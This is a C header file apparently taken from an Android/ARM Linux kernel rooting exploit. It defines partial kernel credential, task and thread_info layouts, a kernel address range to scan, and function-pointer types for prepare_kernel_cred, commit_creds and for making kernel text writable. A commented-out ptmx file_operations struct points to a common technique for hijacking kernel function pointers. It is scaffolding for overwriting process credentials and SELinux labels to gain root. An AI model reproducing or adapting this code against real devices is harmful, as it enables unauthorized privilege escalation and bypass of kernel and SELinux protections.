#ifndef _M_BECOME_ROOT_H
#define _M_BECOME_ROOT_H

#define KERNEL_START_ADDR 	0xC0008000U
#define KERNEL_END_ADDR		( KERNEL_START_ADDR + 1024 * 1024 * 800 )

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};

struct kernel_cap_struct {
	unsigned long cap[2];
};
struct cred0 {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};
struct cred1 {
	unsigned long usage;
	unsigned long unknow[3];
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};
struct list_head {
	struct list_head *next;
	struct list_head *prev;
};
struct task_struct_partial_0 {
	volatile long state; /* -1 unrunnable, 0 runnable, >0 stopped */
	void *stack;
};
struct task_struct_partial_1 {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};
struct thread_info_partial {
	unsigned long flags; /* low level flags */
	int preempt_count; /* 0 => preemptable, <0 => bug */
	unsigned long addr_limit; /* address limit */
	struct task_struct *task; /* main task structure */
	struct exec_domain *exec_domain; /* execution domain */
	/* ... */
};
struct credCompound {
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

typedef struct _processSt {
	uint32_t ruid;
	uint32_t euid;
	uint32_t suid;
	uint32_t rgid;
	uint32_t egid;
	uint32_t sgid;
	uint32_t label0;
	uint32_t label1;
} ProcessSt;

typedef struct cred *(*prepare_kernel_credFunc)(struct task_struct *);
typedef int (*commit_credsFunc)(struct cred *);

typedef void (*mem_text_writeable_spinlockFunc)(unsigned int* pFlag);
typedef void (*mem_text_writeable_spinunlockFunc)(unsigned int* pFlag);
typedef void (*mem_text_address_writeableFunc)(void* addr);
typedef void (*mem_text_address_restoreFunc)();

struct pid_namespace;
typedef struct task_struct_partial_0* (*find_task_by_pid_nsFunc)(pid_t nr, struct pid_namespace *ns);
typedef struct task_struct_partial_0* (*find_task_by_vpidFunc)(pid_t vnr);

extern char szSELinux[512];
void initProcessSt();
int callback() ;
void printBecomeLog();

#endif

/**
static struct file_operations ptmx_fops;
struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
	ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
	int (*readdir) (struct file *, void *, filldir_t);
	unsigned int (*poll) (struct file *, struct poll_table_struct *);
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
	int (*mmap) (struct file *, struct vm_area_struct *);
	int (*open) (struct inode *, struct file *);
	int (*flush) (struct file *, fl_owner_t id);
	int (*release) (struct inode *, struct file *);
	int (*fsync) (struct file *, loff_t, loff_t, int datasync);
	int (*aio_fsync) (struct kiocb *, int datasync);
	int (*fasync) (int, struct file *, int);
	int (*lock) (struct file *, int, struct file_lock *);
	ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
	unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
	int (*check_flags)(int);
	int (*flock) (struct file *, int, struct file_lock *);
	ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
	ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
	int (*setlease)(struct file *, long, struct file_lock **);
	long (*fallocate)(struct file *file, int mode, loff_t offset,
			  loff_t len);
};
 */
